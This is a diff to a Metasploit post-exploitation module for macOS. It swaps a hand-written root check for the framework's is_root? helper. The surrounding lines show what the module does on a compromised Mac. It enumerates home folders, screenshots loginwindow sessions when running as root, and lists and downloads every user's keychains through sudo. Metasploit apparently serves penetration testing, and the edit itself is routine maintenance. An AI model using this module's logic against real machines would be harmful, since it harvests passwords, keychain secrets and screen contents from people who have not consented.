@@ -7,6 +7,7 @@ require 'msf/core/auxiliary/report'
 
 class MetasploitModule < Msf::Post
   include Msf::Post::File
+  include Msf::Post::OSX::Priv
   include Msf::Auxiliary::Report
 
   def initialize(info={})
@@ -33,8 +34,7 @@ class MetasploitModule < Msf::Post
       host = cmd_exec("hostname")
     end
     print_status("Running module against #{host}")
-    running_root = check_root
-    if running_root
+    if is_root?
       print_status("This session is running as root!")
     end
 
@@ -100,12 +100,6 @@ class MetasploitModule < Msf::Post
     # Create the log directory
     ::FileUtils.mkdir_p(logs)
     return logs
-  end
-
-  # Checks if running as root on the target
-  def check_root
-    # Get only the account ID
-    cmd_exec("/usr/bin/id", "-ru") == "0"
   end
 
   # Checks if the target is OSX Server
@@ -204,7 +198,7 @@ class MetasploitModule < Msf::Post
     if session.type =~ /shell/
 
       # Enumerate and retreave files according to privilege level
-      if not check_root
+      if not is_root?
 
         # Enumerate the home folder content
         home_folder_list = cmd_exec("/bin/ls -ma ~/").split(", ")
@@ -285,7 +279,7 @@ class MetasploitModule < Msf::Post
     if ver_num =~ /10\.(7|6|5)/
       print_status("Capturing screenshot")
       picture_name = ::Time.now.strftime("%Y%m%d.%M%S")
-      if check_root
+      if is_root?
         print_status("Capturing screenshot for each loginwindow process since privilege is root")
         if session.type =~ /shell/
           loginwindow_pids = cmd_exec("/bin/ps aux \| /usr/bin/awk \'/name/ \&\& \!/awk/ \{print \$2\}\'").split("\n")
@@ -373,7 +367,7 @@ class MetasploitModule < Msf::Post
       next if u.chomp =~ /Shared|\.localized/
       users << u.chomp
     end
-    if check_root
+    if is_root?
       users.each do |u|
         print_status("Enumerating and Downloading keychains for #{u}")
         keychain_files = cmd_exec("/usr/bin/sudo -u #{u} -i /usr/bin/security list-keychains").split("\n")
